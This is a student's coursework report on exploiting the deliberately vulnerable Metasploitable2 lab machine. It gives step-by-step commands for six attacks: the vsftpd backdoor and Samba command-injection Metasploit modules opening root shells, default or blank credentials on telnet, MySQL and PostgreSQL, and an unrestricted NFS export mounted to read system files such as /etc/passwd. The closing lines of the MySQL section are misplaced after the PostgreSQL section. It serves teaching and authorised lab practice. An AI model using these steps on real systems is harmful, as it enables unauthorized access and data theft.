# Metasploitable2 Exploitation Report

**Name:** Emmanuel Gregory Opoku Owusu-Afriyie
**Index Number:** 4195524
**Date:** 2026-09-21
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap

---

## Reconnaissance Summary

Ran an nmap service/version scan against the target:

Key open ports found:
- 21/tcp - vsftpd 2.3.4 (anonymous FTP login allowed)
- 22/tcp - OpenSSH 4.7p1 Debian 8ubuntu1
- 23/tcp - Linux telnetd
- 25/tcp - Postfix smtpd
- 53/tcp - ISC BIND 9.4.2
- 80/tcp - Apache httpd 2.2.8 (Ubuntu) DAV/2
- 111/tcp - rpcbind
- 2049/tcp - nfs

---

## Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523)
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** This exact vsftpd version has a known, publicly documented backdoor built into that release of the source code. Metasploit ships a purpose-built module for it, so it's the fastest and most reliable way to exploit this specific vulnerability rather than crafting a manual payload.
- **Steps:**
  1. `msfconsole`
  2. `search vsftpd`
  3. `use 1` (exploit/unix/ftp/vsftpd_234_backdoor)
  4. `set RHOSTS 192.168.1.3`
  5. `set LHOST <kali-ip>`
  6. `exploit`
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: the nmap scan identified the vulnerable vsftpd version.
  - Weaponization: selecting the matching Metasploit module and setting RHOSTS/LHOST paired the vulnerability with a working exploit configuration.
  - Delivery/Exploitation: running `exploit` sent the malicious connection that triggered the backdoor.
  - Installation/C2: a Meterpreter session was established, giving remote control of the target.
  - Actions on Objectives: ran `getuid`/`sysinfo` to confirm root-level access.
- **Outcome / Impact:** Obtained a root-level Meterpreter session on the target.

---

## Exploit 2: Telnet Weak/Default Credentials

- **Service / Port:** Telnet / 23
- **Vulnerability:** Weak/default credentials (msfadmin:msfadmin) with no protection against plaintext credential exposure
- **Tool Used:** telnet (manual, no Metasploit)
- **Why This Tool:** Telnet itself is the vulnerable service — the issue isn't a code exploit but weak authentication, so a plain telnet client is the correct and most direct tool to demonstrate the weakness, rather than a scripted exploit module.
- **Steps:**
  1. `telnet 192.168.1.3`
  2. Login: `msfadmin`
  3. Password: `msfadmin`
  4. `whoami` / `id` to confirm access
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified telnet open on port 23.
  - Delivery: connecting via `telnet` sent the login attempt to the target.
  - Exploitation: the weak credentials succeeded, granting an authenticated shell.
  - Actions on Objectives: ran commands (`whoami`, `id`) inside the shell to confirm and use access.
- **Outcome / Impact:** Obtained an authenticated shell as user `msfadmin` on the target via plaintext telnet.


  ## Exploit 3: NFS Misconfigured Export

- **Service / Port:** NFS / 2049 (via rpcbind / 111)
- **Vulnerability:** NFS share exported with no access restriction (`/ *`), allowing any host to mount the target's entire root filesystem
- **Tool Used:** showmount + mount (manual, no Metasploit)
- **Why This Tool:** The vulnerability is a misconfiguration, not a code flaw — native NFS client tools (`showmount`, `mount`) are the correct way to demonstrate that the export has no restriction, rather than a scripted exploit module.
- **Steps:**
  1. `showmount -e 192.168.1.3` — confirmed `/` exported with `*` (no restriction)
  2. `mkdir /tmp/nfs_mount`
  3. `sudo mount -t nfs 192.168.1.3:/ /tmp/nfs_mount`
  4. `ls -la /tmp/nfs_mount` — confirmed full root filesystem browsable
- **Evidence:** evidence/exploit3.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified NFS/rpcbind open on ports 111/2049.
  - Delivery: `showmount` and `mount` commands connected to the target's NFS service.
  - Exploitation: the misconfigured export allowed mounting without authentication.
  - Actions on Objectives: browsed the target's root filesystem, demonstrating full read access to system files.
- **Outcome / Impact:** Gained unauthenticated read access to the target's entire filesystem via NFS. (Optional further step: files could be read directly, e.g. `cat /tmp/nfs_mount/etc/passwd`.)


## Exploit 4: Samba usermap_script Command Injection

- **Service / Port:** Samba (SMB) / 139, 445
- **Vulnerability:** Samba "username map script" Command Execution (CVE-2007-2447)
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** The vulnerable Samba version range (3.X-4.X) has a specific configuration flaw allowing shell metacharacters to be injected via the username field. Metasploit's dedicated module automates crafting and delivering this injection reliably, which would otherwise require manually replicating the exact SMB protocol interaction.
- **Steps:**
  1. `nmap -p 139,445 -sV 192.168.1.3` — confirmed Samba smbd 3.X-4.X
  2. `msfconsole` → `search usermap_script`
  3. `use 0` (exploit/multi/samba/usermap_script)
  4. `set RHOSTS 192.168.1.3`
  5. `set LHOST 192.168.1.4`
  6. `exploit`
  7. `whoami` / `id` to confirm access
- **Evidence:** evidence/exploit4.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: nmap identified the vulnerable Samba version on 139/445.
  - Weaponization: selecting the usermap_script module and configuring RHOSTS/LHOST paired the vulnerability with a working payload.
  - Delivery/Exploitation: running `exploit` sent the malicious username field, triggering command injection.
  - Installation/C2: a command shell session was opened, giving remote control of the target.
  - Actions on Objectives: ran `whoami`/`id`, confirming root-level access on the target.
- **Outcome / Impact:** Obtained a root-level (uid=0, gid=0) remote command shell on the target via SMB command injection.

  ## Exploit 5: MySQL Root Account with No Password

- **Service / Port:** MySQL / 3306
- **Vulnerability:** MySQL root account configured with no password, allowing unauthenticated remote login
- **Tool Used:** mysql client (manual, no Metasploit)
- **Why This Tool:** The vulnerability is a weak/blank credential configuration, not a code flaw — the native mysql CLI client is the correct and most direct way to demonstrate unauthenticated access, rather than a scripted exploit module.
- **Steps:**
  1. `nmap -p 3306 -sV 192.168.1.3` — confirmed MySQL 5.0.51a-3ubuntu5
  2. `mysql -h 192.168.1.3 -u root --skip-ssl`
  3. Logged in successfully with no password prompt
  4. `show databases;` to confirm access
- **Evidence:** evidence/exploit5.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified MySQL open on port 3306.
  - Delivery: the mysql client connection sent the login attempt to the target.

 ## Exploit 6: PostgreSQL Default Credentials

- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** PostgreSQL superuser account (postgres) configured with default/weak password
- **Tool Used:** psql (manual, no Metasploit)
- **Why This Tool:** The vulnerability is weak default credentials, not a code flaw — the native psql client is the correct and most direct way to demonstrate unauthenticated-equivalent access, rather than a scripted exploit module.
- **Steps:**
  1. `nmap -p 5432 -sV 192.168.1.3` — confirmed PostgreSQL 8.3.0-8.3.7
  2. `psql -h 192.168.1.3 -U postgres`
  3. Entered password: `postgres`
  4. `SELECT version();` to confirm access
- **Evidence:** evidence/exploit6.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified PostgreSQL open on port 5432.
  - Delivery: the psql client connection sent the login attempt to the target.
  - Exploitation: the default password allowed successful authentication as the superuser.
  - Actions on Objectives: ran `SELECT version();` to confirm and demonstrate the level of access gained.
- **Outcome / Impact:** Obtained superuser-level access to the target's PostgreSQL server using default credentials.
  - Exploitation: the blank root password allowed authentication with no credentials.
  - Actions on Objectives: ran `show databases;` to enumerate accessible data.
- **Outcome / Impact:** Obtained unauthenticated root-level access to the target's MySQL server, exposing all databases.

 
